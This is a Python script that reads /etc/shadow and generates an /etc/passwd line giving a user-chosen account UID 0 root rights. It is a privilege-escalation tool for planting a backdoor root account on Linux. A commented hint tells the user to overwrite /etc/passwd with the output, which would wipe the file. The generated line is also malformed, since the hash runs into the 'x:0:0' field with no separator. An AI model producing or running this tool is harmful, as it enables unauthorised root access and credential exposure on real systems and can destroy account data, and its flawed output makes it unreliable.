import os
import crypt






####to check witch hash your system are using####


name = input("Insert Username:\n")
password = input("Insert Password:\n")
rootpriv = "x:0:0:root:/root:/bin/bash"

print("chech what type of hash your distro is using:")
os.system("cat /etc/shadow | grep '$'")
os.system("sudo cat /etc/shadow | grep '$'")


print("""

---------------------------------------------------------------------------------------------
	Chech above what type of hash your distro is using:
---------------------------------------------------------------------------------------------	

	# $1 = MD5
	# $2 = BLOWFISH
	# $5 = SHA-256
	# $6 = SHA-512

---------------------------------------------------------------------------------------------
	""")



salt_sha512 = crypt.crypt(password, crypt.mksalt(crypt.METHOD_SHA512))


salt_sha256 = crypt.crypt(password, crypt.mksalt(crypt.METHOD_SHA256))


salt_blow = crypt.crypt(password, crypt.mksalt(crypt.METHOD_BLOWFISH))


salt_md5 = crypt.crypt(password, crypt.mksalt(crypt.METHOD_MD5))


salt_crypt = crypt.crypt(password, crypt.mksalt(crypt.METHOD_CRYPT))




make_hash = input("What hash do you want to use?\n")
if make_hash == "$1":
	print(f"[*]Salted MD5:\n [+] {name}:{salt_md5}{rootpriv}")
elif make_hash == "$2":
	print(f"[*]Salted Blowfish:\n [+] {name}:{salt_blow}{rootpriv}")
elif make_hash == "$5":
	print(f"[*]Salted SHA256:\n [+] {name}:{salt_sha256}{rootpriv}")
elif make_hash == "$6":
	print(f"[*]Salted SHA512:\n [+] {name}:{salt_sha512}{rootpriv}")
else:
	print(f"[*]Salted crypt:\n [+] {name}:{salt_crypt}{rootpriv}")




























###print statments with added username and priv###

#print(
#f"""[*]Salted SHA512:\n [+] {name}:{salt_sha512}{rootpriv}
#---------------------------------------------------------------------------------------------
#[*]Salted SHA256:\n [+] {name}:{salt_sha256}{rootpriv}
#---------------------------------------------------------------------------------------------
#[*]Salted Blowfish:\n [+] {name}:{salt_blow}{rootpriv}
#---------------------------------------------------------------------------------------------
#[*]Salted MD5:\n [+] {name}:{salt_md5}{rootpriv}
#---------------------------------------------------------------------------------------------
#[*]Salted crypt:\n [+] {name}:{salt_crypt}{rootpriv}
#---------------------------------------------------------------------------------------------

#""")

#print("""
#Pick your desired hash and do "cat *hash* >  /etc/passwd"


	#""")



















